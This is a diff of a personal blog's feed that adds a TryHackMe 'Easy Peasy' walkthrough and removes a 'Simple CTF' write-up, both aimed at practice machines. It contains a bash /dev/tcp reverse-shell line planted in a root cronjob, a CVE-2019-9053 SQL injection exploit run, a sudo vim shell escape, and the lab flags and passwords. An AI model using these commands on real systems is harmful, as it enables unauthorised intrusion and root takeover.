@@ -1,4 +1,270 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-23T17:09:41+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-24T01:16:32+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>
+
+<p>Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>
+
+<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>
+
+<p><br /></p>
+
+<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>
+
+<p><br /></p>
+<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>
+
+<p>Look carefully at port 80.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>
+
+<p>The highest port is 65524.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>
+
+<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>
+
+<p><br /></p>
+
+<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>
+
+<p>I’m visiting the site running on port 80 and I see such a page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home" /></p>
+
+<p>I checked the source page but couldn’t find anything remarkable.</p>
+
+<p>Let’s do a gobuster scan and see if we can find anything.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one" /></p>
+
+<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever" /></p>
+
+<p>Nothing appears on the page. Let’s look at the source page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode" /></p>
+
+<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{f1rs7_fl4g}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>
+
+<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>
+
+<p>Let’s look at the type of hash with hash-identifer.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots" /></p>
+
+<p>We found the type MD5. Let’s crack it.</p>
+
+<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash">Here</a></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots" /></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{1m_s3c0nd_fl4g}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>
+
+<p>When we take a look at Apache, something remarkable emerges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3" /></p>
+
+<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{9fdafbd64c47471a8f54cd3fc64cd312}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>
+
+<p>When we go to the source page of the Apache page, we see something like this.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>
+
+<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
+<p>what is the password?</p>
+
+<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>
+
+<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict" /></p>
+
+<p>Let’s check the source of the page.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
+
+<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>
+
+<p>First I look at the type with hash-identifier.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id" /></p>
+
+<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: mypasswordforthatjob</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>
+
+<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+$ steghide extract -sf binarycodepixabay.jpg
+$ cat secrettext.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext" /></p>
+
+<p>We found the username and password.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>
+
+<p>Let’s crack the encrypted password first.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>
+
+<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin" /></p>
+
+<p>And we are inside. Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag" /></p>
+
+<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{a0jvgf33zfa0ez4y}</code></strong>. Let’s crack it.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{n0wits33msn0rm4l}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>
+
+<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron" /></p>
+
+<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>
+
+<p>First, let’s set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Let’s change the file on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
+#!/bin/bash
+# i will run as root
+bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob" /></p>
+
+<p>After waiting for a while, we get root privileges.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in" /></p>
+
+<p>Yes, we have root privileges. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{63a9f0ea7bb98050796b649e85481845}</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
 
 <p>Let’s start.</p>
 
@@ -1647,148 +1913,4 @@ $ cat /tmp/flag.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="recon," /><category term="privesc," /><category term="webappsec" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/vulnversity.png" /><media:content medium="image" url="http://localhost:4000/assets/img/vulnversity.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Simple CTF</title><link href="http://localhost:4000/tryhackme-simple-ctf/" rel="alternate" type="text/html" title="TryHackMe - Simple CTF" /><published>2023-03-13T00:00:00+03:00</published><updated>2023-03-13T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-simple-ctf</id><content type="html" xml:base="http://localhost:4000/tryhackme-simple-ctf/"><![CDATA[<p>This is an easy CTF. Let’s start.</p>
-
-<p><br /></p>
-
-<h3 id="1-how-many-services-are-running-under-port-1000">1. How many services are running under port 1000?</h3>
-
-<p>We first run a <code class="language-plaintext highlighter-rouge">nmap</code> scan to find running ports.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.22.97
-</code></pre></div></div>
-<p><img src="/assets/img/tryhackme/simple_ctf/nmap.png" alt="nmap" /></p>
-
-<p>As you can see, a total of 3 ports are running. These are <code class="language-plaintext highlighter-rouge">21/tcp FTP</code>, <code class="language-plaintext highlighter-rouge">80/tcp HTTP</code>, <code class="language-plaintext highlighter-rouge">and 2222/tcp SSH.</code></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">2</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="2-what-is-running-on-the-higher-port">2. What is running on the higher port?</h3>
-
-<p>As you will remember from the previous question, the highest port is 2222/tcp. And SSH is running on this port.</p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">SSH</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="3-whats-the-cve-youre-using-against-the-application">3. What’s the CVE you’re using against the application?</h3>
-
-<p>When we visit the website, we see the default page of apache.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/apache.png" alt="apache" /></p>
-
-<p>First of all, I did a <code class="language-plaintext highlighter-rouge">nikto</code> scan, but no results came out. Now let’s do a directory scan with <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.22.97/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/gobuster.png" alt="gobuster" /></p>
-
-<p>Yes, we discovered the <code class="language-plaintext highlighter-rouge">/simple/</code> directory here. Let’s see what it contains.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/cms.png" alt="cms" /></p>
-
-<p>A CMS page appears. This is the app the question tells us.
-At the bottom of the page, we find the CMS version.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/version.png" alt="version" /></p>
-
-<p>Now, we’re looking for any CMS Made Simple vulnerability in exploit-db, and let’s not forget that the version is <code class="language-plaintext highlighter-rouge">2.2.8</code>.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/db.png" alt="db" /></p>
-
-<p>As a result of the search, we detect the vulnerability that is suitable for the CMS version of our target. 
-<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/exploit.png" alt="exploit" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">CVE- 2019-9053 </code></strong></p>
-
-<p><br /></p>
-
-<h3 id="4-to-what-kind-of-vulnerability-is-the-application-vulnerable">4. To what kind of vulnerability is the application vulnerable?</h3>
-
-<p>As you can see in the previous question, the vulnerability is <code class="language-plaintext highlighter-rouge">SQL Injection</code>.</p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">sqli</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="5-whats-the-password">5. What’s the password?</h3>
-
-<p><em>Hint: You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass</em></p>
-
-<p>We need to download the exploit in exploit-db and run it as it says.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/how.png" alt="how" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ python3 46635.py -u http://10.10.52.237/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
-</code></pre></div></div>
-
-<p>We want to run it but we can’t. I guess we cannot run this code because it is written in the python2 script, and we encounter many errors. I fixed it as best I could, you can download and run it from <a href="/assets/img/tryhackme/simple_ctf/46635.py">here</a>. If you want to fix it, you can ask in the comments.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/pass.png" alt="pass" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">secret</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="6-where-can-you-login-with-the-details-obtained">6. Where can you login with the details obtained?</h3>
-
-<p>We may use these credentials to login against ssh <code class="language-plaintext highlighter-rouge">(running on port 2222)</code></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">ssh</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="7-whats-the-user-flag">7. What’s the user flag?</h3>
-
-<p>Using the information we collect, we login to <code class="language-plaintext highlighter-rouge">ssh</code> and then we get the <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ ssh mitch@10.10.52.237 -p 2222
- $ whoami
- $ cat user.txt
-</code></pre></div></div>
-<p><img src="/assets/img/tryhackme/simple_ctf/login.png" alt="login" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">G00d j0b, keep up!</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="8-is-there-any-other-user-in-the-home-directory-whats-its-name">8. Is there any other user in the home directory? What’s its name?</h3>
-
-<p>We go to the /home directory and look at the users with the <code class="language-plaintext highlighter-rouge">ls -al</code> command.</p>
-
-<p><img src="/assets/img/tryhackme/simple_ctf/users.png" alt="users" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">sunbath</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="9-what-can-you-leverage-to-spawn-a-privileged-shell">9. What can you leverage to spawn a privileged shell?</h3>
-
-<p>First, we run the <code class="language-plaintext highlighter-rouge">sudo -l</code> command. We notice that Vim can run without the need for a root password.</p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">vim</code></strong></p>
-
-<p><br /></p>
-
-<h3 id="10-whats-the-root-flag">10. What’s the root flag?</h3>
-
-<p>Now we can get root privileges using vim. The code we will run is as follows.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo vim -c '!sh'
-$ whoami
-$ cat /root/root.txt
-</code></pre></div></div>
-<p><img src="/assets/img/tryhackme/simple_ctf/root.png" alt="root" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">W3ll d0n3. You made it!</code></strong></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="enumeration," /><category term="privesc" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/simple.png" /><media:content medium="image" url="http://localhost:4000/assets/img/simple.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="recon," /><category term="privesc," /><category term="webappsec" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/vulnversity.png" /><media:content medium="image" url="http://localhost:4000/assets/img/vulnversity.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
